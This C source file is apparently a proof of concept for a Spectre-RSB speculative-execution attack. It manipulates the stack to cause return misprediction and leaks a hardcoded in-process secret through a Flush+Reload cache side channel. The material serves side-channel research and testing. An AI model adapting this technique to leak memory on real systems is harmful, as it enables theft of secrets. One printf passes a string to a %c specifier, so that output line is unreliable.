#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#include "../sidechannel/flush_reload.h"


#define CACHE_MISS 80
#define PAGESIZE 4096
#define SECRET "foobar"
#define TRIES 10
char* oracle_block;

// ! TODO: try void returns?


// Pop return address from the software stack, causing misspeculation when hitting the return
int __attribute__ ((noinline)) call_manipulate_stack() {
  register uintptr_t sp asm ("sp"); // additionally, flush stack pointer to enlarge execution window
#if defined(__i386__) || defined(__x86_64__)
  asm volatile("pop %%rax\n" : : : "rax");
  _mm_clflush(sp);
#elif defined(__aarch64__)
  asm volatile("ldp x29, x30, [sp],#16\n" : : : "x29");
#endif
  return 0;
}

int __attribute__ ((noinline)) call_leak(char s) {
  // Manipulate the stack so that we don't return here, but to call_start
  call_manipulate_stack();
  // architecturally, this is never executed
  // Encode data in covert channel
  maccess(oracle_block + s * PAGESIZE);
  return 2;
}

int __attribute__ ((noinline)) call_start(char s) {
  call_leak(s);
  //_mm_mfence(); // improves execution cycle count in gem5, but decreases accuracy natively
  return 1;
}

void confuse_compiler() {
  // this function -- although never called -- is required
  // otherwise, the compiler replaces the calls with jumps
  char s = 'A';

  call_start(s);
  call_leak(s);
  call_manipulate_stack();

}

void readMemoryByte(char sec, uint8_t value[2], int score[2]){
  static int results[256];
  static int tries, i, j, k, mix_i;
  size_t training_x, x;

  for (i = 0; i < 256; i++){
    results[i] = 0;
  }
  for (tries = TRIES; tries > 0; tries--) {

    flush(oracle_block, PAGESIZE);


    _mm_mfence();
    call_start(sec);
    _mm_mfence();
    probe(oracle_block,CACHE_MISS, PAGESIZE, results);

    
    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */

  }
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int main(int argc, const char **argv) {
  // Detect cache threshold
  char* secret = SECRET;
  size_t secret_size = sizeof(SECRET) - 1;

  char cc;

  oracle_block = malloc(256 * PAGESIZE);
  memset(oracle_block, 1, 256*PAGESIZE);
  flush(oracle_block, PAGESIZE);
  int score[2];
  uint8_t value[2];
  


  _mm_mfence();
  
  for (int p =0; p < secret_size; p++) {

    cc = secret[p % secret_size]; // precomputation of character to extract
    printf("Attempting to read %c... ", cc);
    readMemoryByte(cc, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=’%c’ score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : "?"), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
  }
  free(oracle_block);

  return (0);
}
